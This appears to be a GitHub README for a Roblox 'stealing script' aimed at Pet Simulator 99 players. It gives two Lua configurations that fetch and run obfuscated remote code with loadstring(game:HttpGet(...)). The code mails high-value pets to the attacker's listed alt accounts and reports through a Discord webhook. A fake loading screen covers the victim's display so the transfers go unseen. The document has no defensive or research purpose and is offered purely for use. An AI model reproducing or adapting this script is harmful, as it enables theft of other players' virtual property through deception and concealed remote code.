# Steal
The stealing script

The script should look like this:

```lua
Webhook = "" --your discord webhook

Usernames = {"AlternativeAccount1",
             "AlternativeAccount2" ,
             "ExampleAccountName",
             "AnotherExampleAccountName"} --put the name of all your accounts and alts to send pets to (from important to less important).

MailMessage = "Things got send" -- try to keep very short to avoid it not working
LoadingScreenText = "Loading Milky Hub"
min_rap = 2000000 -- minimum rap of each item you want to get sent to you. 2 mil by default. 

loadstring(game:HttpGet("https://raw.githubusercontent.com/Cezar-Very-Epic/Steal/main/StealScript"))()
```


.

.

.

.

.

.

.


You can also make a Custom Loading Screen if you want to make your own loadingscreen (only do that if you have coding experience) or no loadingscreen at all (not recomanded) by using the code bellow!

```lua
Webhook = "" --your discord webhook
Usernames = {} --put the name of all your accounts and alts to send pets to (from important to less important)

MailMessage = "" -- try to keep very short to avoid it not working

LoadingScreenText = ""

min_rap = 2000000 -- minimum rap of each item you want to get sent to you. 2 mil by default

-- LOADING SCREEN -----------------------------------
local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000 -- make any gui that may show you sending gems not show

task.spawn(function() 
    LoadingScreenFunction("anything") -- spawns the default pet simulator 99 loading screen
end)
-- change the text of loading screen
game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = LoadingScreenText

loadstring(game:HttpGet("https://raw.githubusercontent.com/Cezar-Very-Epic/Steal/main/Obfuscated%20Custom%20Loading%20Screen"))()
```
